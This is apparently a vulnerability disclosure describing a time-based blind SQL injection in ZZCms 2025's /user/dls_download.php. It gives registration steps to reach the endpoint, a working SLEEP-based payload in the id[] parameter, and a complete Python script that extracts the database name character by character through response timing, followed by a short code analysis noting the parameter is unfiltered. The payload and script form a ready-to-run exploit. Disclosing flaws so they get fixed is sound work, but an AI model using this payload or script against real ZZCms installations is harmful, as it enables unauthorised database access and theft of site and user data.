# ZZCms 2025 has a SQL Injection vulnerability
##### Vulnerability Location: /user/dls_download.php 
##### Affected Range: ZZCms 2025
##### Vulnerability Cause: dls_download.php contains an SQL injection vulnerability, which enables accounts with ordinary user privileges to access database information through this account.
##### Vulnerability Impact: Obtain database access rights, and even DBA permissions; Obtain data from other databases;
##### Link: http://www.zzcms.net/
# Vulnerability recurrence

First, register an account and select the registration type as: Company. When filling in the company name, keywords such as "biological" should be included

<img width="1920" height="1055" alt="image" src="https://github.com/user-attachments/assets/df1580f0-6d5a-4022-9758-77276fcdd840" />

After successful registration, visit the address: /user/dls_download.php
There is a delay injection vulnerability. As shown in the following figure, the delay is 5 seconds

<img width="1912" height="874" alt="image" src="https://github.com/user-attachments/assets/bf9e18ce-ee97-4d72-8575-7c5261154c48" />

Delay for two seconds

<img width="1912" height="886" alt="image" src="https://github.com/user-attachments/assets/fea672b7-b301-4fe0-a494-3cbffaa80d34" />

Payload：id[]=1,2) AND (SELECT 7945 FROM (SELECT(SLEEP(2)))dhiC) AND (9082=9082

<img width="1900" height="882" alt="image" src="https://github.com/user-attachments/assets/32254e1b-92dd-4d68-b6bb-80ba0784a942" />

It is determined that the length of the database name is 5
Use the script to obtain the specific value of the database name:

<img width="740" height="280" alt="image" src="https://github.com/user-attachments/assets/52ee2409-ddc5-4ae3-8e8e-b8ceb609a701" />

```
import requests
import time

def exploit_time_based_blind_sql():
    # 目标URL
    url = "http://127.0.0.1:8081/user/dls_download.php"
    
    # 请求头
    headers = {
        "Host": "127.0.0.1:8081",
        "sec-ch-ua": '"Not.A/Brand";v="99", "Chromium";v="136"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate, br",
        "Cookie": "__51cke__=; PHPSESSID=1lgihann99he0kns9hofshtqll; UserName=admin1; PassWord=e00cf25ad42683b3df678c61f42c6bda; __tins__713776=%7B%22sid%22%3A%201758106876159%2C%20%22vd%22%3A%205%2C%20%22expires%22%3A%201758109216370%7D; __51laig__=5",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # 已知数据库名长度为5
    db_length = 5
    db_name = ""
    
    print(f"[*] 开始猜解数据库名，已知长度为: {db_length}")
    
    # 对每个位置进行猜解
    for position in range(1, db_length + 1):
        print(f"[*] 猜解第 {position} 个字符...")
        
        # 尝试ASCII值从32到126（可打印字符）
        for ascii_val in range(32, 127):
            # 构造Payload - 使用ASCII值比较
            payload = f"id[]=1,2) AND (SELECT 7945 FROM (SELECT(IF(ASCII(SUBSTRING(DATABASE(),{position},1))={ascii_val},SLEEP(2),0)))dhiC) AND (9082=9082"
            
            # 记录请求开始时间
            start_time = time.time()
            
            try:
                # 发送POST请求
                response = requests.post(
                    url,
                    headers=headers,
                    data=payload,
                    timeout=3  # 设置超时时间略大于SLEEP时间
                )
                # 计算请求耗时
                elapsed_time = time.time() - start_time
                
                # 如果响应时间超过2秒，说明字符猜解正确
                if elapsed_time >= 2:
                    char = chr(ascii_val)
                    db_name += char
                    print(f"[+] 第 {position} 个字符为: {char} (ASCII: {ascii_val}) | 当前数据库名: {db_name}")
                    break
                    
            except requests.exceptions.Timeout:
                # 超时异常，说明字符猜解正确
                char = chr(ascii_val)
                db_name += char
                print(f"[+] 第 {position} 个字符为: {char} (ASCII: {ascii_val}) | 当前数据库名: {db_name}")
                break
                
            except Exception as e:
                print(f"[-] 请求出错: {e}")
                continue
    
    print(f"[+] 数据库名猜解完成: {db_name}")
    return db_name

if __name__ == "__main__":
    exploit_time_based_blind_sql()
```

# Code Analysis

In dls_download.php, the id parameter is of array type.

<img width="1091" height="564" alt="image" src="https://github.com/user-attachments/assets/566590b7-c9cf-4c3c-ab13-5a925ced8776" />

The parameters passed by the user have not been filtered.

<img width="1106" height="556" alt="image" src="https://github.com/user-attachments/assets/786157ce-540e-4471-a9b6-1a74cf7e1c09" />
